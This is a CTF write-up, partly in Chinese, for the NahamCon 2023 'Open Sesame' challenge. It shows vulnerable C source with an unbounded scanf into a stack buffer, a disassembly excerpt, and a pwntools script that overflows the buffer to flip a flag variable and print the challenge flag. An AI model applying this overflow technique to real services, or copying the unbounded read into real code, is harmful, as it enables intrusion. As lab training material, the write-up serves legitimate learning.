# Open Sesame
```
Something about forty thieves or something? I don't know, they must have had some secret incantation to get the gold!

Download the files below and press the Start button in the top-right to begin this challenge.

Special thank you to HALBORN for sponsoring NahamCon 2023 CTF! This category is dedicated to them as a token of gratitude.



Connect with:
nc challenge.nahamcon.com 30239
```
下载到源代码文件和二进制文件，
```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#define SECRET_PASS "OpenSesame!!!"

typedef enum {no, yes} Bool;

void flushBuffers() {
    fflush(NULL);
}

void flag()
{  
    system("/bin/cat flag.txt");
    flushBuffers();
}

Bool isPasswordCorrect(char *input)
{
    return (strncmp(input, SECRET_PASS, strlen(SECRET_PASS)) == 0) ? yes : no;
}

void caveOfGold()
{
    Bool caveCanOpen = no;
    char inputPass[256];
    
    puts("BEHOLD THE CAVE OF GOLD\n");

    puts("What is the magic enchantment that opens the mouth of the cave?");
    flushBuffers();
    
    scanf("%s", inputPass);

    if (caveCanOpen == no)
    {
        puts("Sorry, the cave will not open right now!");
        flushBuffers();
        return;
    }

    if (isPasswordCorrect(inputPass) == yes)
    {
        puts("YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:");
        flag();
    }
    else
    {
        puts("ERROR, INCORRECT PASSWORD!");
        flushBuffers();
    }
}

int main()
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);

    caveOfGold();

    return 0;
}
```
## Writeup
查看二进制，caveCanOpen,inputPass两个stack变量总共占272字节。
```
00000000000011eb <caveOfGold>:
11eb:       55                      push   %rbp
11ec:       48 89 e5                mov    %rsp,%rbp
11ef:       48 81 ec 10 01 00 00    sub    $0x110,%rsp
11f6:       c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%rbp)
```
0x110 = 272, 简单的overflow，用pwntools连接并发送payload：
```
from pwn import *

passwd = b'OpenSesame!!!'
conn = remote('challenge.nahamcon.com',30239)
conn.recvuntil(b'the cave?')
conn.send(passwd+b'A'*(272-len(passwd))+b'\n')
res = conn.recvline()
print(res)
res = conn.recvline()
print(res)
res = conn.recvline()
print(res)
```
得到：
`flag{85605e34d3d2623866c57843a0d2c4da}`
